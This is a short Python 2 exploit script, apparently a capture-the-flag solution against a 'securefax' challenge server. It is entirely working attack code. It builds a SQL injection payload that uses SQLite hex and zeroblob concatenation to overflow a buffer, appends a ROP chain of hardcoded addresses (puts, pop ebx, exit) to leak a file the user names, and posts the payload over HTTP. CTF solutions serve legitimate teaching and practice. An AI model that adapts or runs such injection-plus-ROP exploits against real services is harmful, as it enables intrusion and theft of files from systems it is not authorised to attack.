#!/usr/bin/env python
import urllib
import urllib2

host = 'securefax.ctf.ohcihsiek.jp'

addr_plt_puts   = 0x08048430
addr_plt_exit   = 0x08048450
addr_message    = 0x0804a080
addr_read_msg   = 0x0804857b

addr_pop_ebx    = 0x080483c5

def send(msg,id):
    url = "http://%s/?a=send" % host
    values = {'message':msg, 'id':id}

    data = urllib.urlencode(values)
    req  = urllib2.Request(url,data)
    res  = urllib2.urlopen(req)
    
    return (res.read())

def blob(val):
    d = []
    while val:
        d += [val&0xff]
        val >>= 8
    for v in d:
        val <<= 8
        val += v

    return "||x'%08x'" % val

if __name__=='__main__':
    fname = raw_input('File name >>')
    
    offset = 0x107
    exploit  = "hex(zeroblob(%d))" % (offset/2)
    exploit += "||'a'" if offset%2 else "" 
    exploit += blob(0xcafebabe)
    exploit += blob(addr_read_msg)
    exploit += blob(addr_pop_ebx)
    exploit += blob(addr_message)
    exploit += blob(addr_plt_puts)
    exploit += blob(addr_pop_ebx)
    exploit += blob(addr_message)
    exploit += blob(addr_plt_exit)

    sql = "' and 0 union select %s --" % exploit
    #print exploit
    
    print send(fname,sql)
